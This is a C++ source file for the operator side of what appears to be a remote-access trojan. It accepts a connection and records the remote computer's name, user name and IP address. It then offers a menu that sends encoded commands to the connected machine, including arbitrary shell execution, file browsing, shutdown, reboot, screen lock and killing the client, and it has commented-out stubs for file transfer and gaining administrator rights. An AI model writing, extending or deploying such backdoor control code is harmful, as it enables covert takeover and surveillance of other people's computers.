#include "../tcpSocket/tcpSocke.h"

int process(SOCKET clifd);

int main()
{
	init_Socket();

	SOCKET serfd = CreatServerScoket();

	cout << "wait client connect...\n";

	SOCKET clifd = accept(serfd, NULL, NULL);	//����пͻ�����������
	if (clifd == INVALID_SOCKET)
	{
		//err("accept");
	}
	char buf[BUFSIZ] = { 0 };

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//�������ӳɹ������
	{
		decode(buf);
		cout << buf << endl;
	}
	memset(buf, 0, sizeof(buf));//��������ʼ������ֹ�ظ����

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//�������
	{
		decode(buf);
		cout << "PCName is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//�û���
	{
		decode(buf);
		cout << "UserName is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//IP��ַ
	{
		decode(buf);
		cout << "IP is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	thread th = thread(process, clifd);
	th.detach();
	char beat[20] = { 0 };
	while (true)
	{
		rewind(stdin);
		if (recv(clifd, beat, 20, 0) > 0)
		{
			decode(beat);
			cout << beat << endl;
		}
	}
	close_Socket();
	return 0;
}

int process(SOCKET clifd)
{
	char code[50] = { 0 };
	char sendbuf[BUFSIZ] = { 0 };
	while (true)
	{
		cout << "Enter prompt: " << endl;
		//cout << "1.  filebrowse: File browsing" << endl;
		cout << "2.  shell: Execute shell instructions" << endl;
		//cout << "3.  download: File download" << endl;
		//cout << "4.  upload: File upload" << endl;
		//cout << "5.  upright: Get administrator privileges" << endl;
		cout << "6.  kill: Kill the terminal" << endl;
		cout << "7.  shutdown: shutdown the pc" << endl;
		cout << "8.  reboot: Restart the computer" << endl;
		cout << "9.  cancel: Cancel shutdown" << endl;
		cout << "10. lock: Lock Screen" << endl;
		cout << "Please enter the corresponding instruction: " << endl;
		rewind(stdin);
		cin >> code;//���벢����ָ��
		encode(code);
		send(clifd, code, 50, 0);
		decode(code);
		if (!strcmp(code, "filebrowse"))
		{
			char file[Row] = { 0 };//���塢��ʼ����������ʾ
			char path[100] = { 0 };

			cout << "please input the path" << endl;
			cout << "use two '\\'" << endl;
			cout << "just as 'D:\\\\Games', check the files in Games directory" << endl;
			cout << "and 'D:\\' check the files under drive D. " << endl;

			rewind(stdin);
			cin >> path;//���롢���ܲ�����ָ��
			encode(path);
			send(clifd, path, 100, 0);
			do
			{
				recv(clifd, file, Row, 0);
				cout << file << endl;
			} while (file[0] != 0);
			continue;
		}
		else if (strcmp(code, "shell") == 0)
		{
			char shell[BUFSIZ] = { 0 };
			char res[BUFSIZ * 6] = { 0 };
			cout << "Please enter the shell instruction: ";
			rewind(stdin);
			cin >> shell;
			encode(shell);
			send(clifd, shell, BUFSIZ, 0);
			if (recv(clifd, res, BUFSIZ * 6, 0) > 0)
			{
				rewind(stdin);
				//decode(res);
				cout << res << endl;
			}
			continue;
		}
		else if (strcmp(code, "kill") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "reboot") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "shutdown") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "lock") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else
		{
			cout << "error code" << endl;
			continue;
			rewind(stdin);
		}
		ZeroMemory(code, sizeof(code));
	}
	return 0;
}